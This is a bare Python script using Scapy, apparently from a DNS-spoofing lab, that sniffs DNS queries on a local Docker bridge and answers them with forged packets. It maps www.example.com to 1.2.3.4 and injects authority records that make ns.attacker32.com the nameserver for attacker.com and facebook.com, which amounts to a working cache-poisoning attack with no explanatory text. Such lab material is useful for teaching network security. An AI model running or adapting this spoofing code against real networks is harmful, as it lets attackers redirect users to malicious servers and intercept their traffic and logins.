from scapy. all import *
def spoof_dns (pkt) :

    if(DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode("utf-8")):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP (dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR( rrname=pkt[DNS].qd.qname, type='A' , rdata='1.2.3.4', ttl=259200)
        NSSec1= DNSRR( rrname="attacker.com", type='NS' , rdata='ns.attacker32.com', ttl=259200)
        NSSec2= DNSRR( rrname="facebook.com", type='NS' , rdata='ns.attacker32.com', ttl=259200)
        Anssec1 = DNSRR( rrname="ns1.attacker.com", type='A' , rdata='1.2.3.4', ttl=259200)
        Anssec2 = DNSRR( rrname="ns2.attacker.com", type='A' , rdata='2.3.4.5', ttl=259200)
        DNSpkt = DNS (id=pkt[DNS].id, qd=pkt[DNS].qd,aa=1, rd=0, qdcount=1, qr=1, ancount=1,nscount=2,ns=NSSec1/NSSec2,an=Anssec, ar=Anssec1/Anssec2)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send ( spoofpkt ,iface='br-8d800be843ba')

pkt=sniff(filter='udp and (src host 10.9.0.53 and dst port 53) ', prn=spoof_dns,iface='br-8d800be843ba')
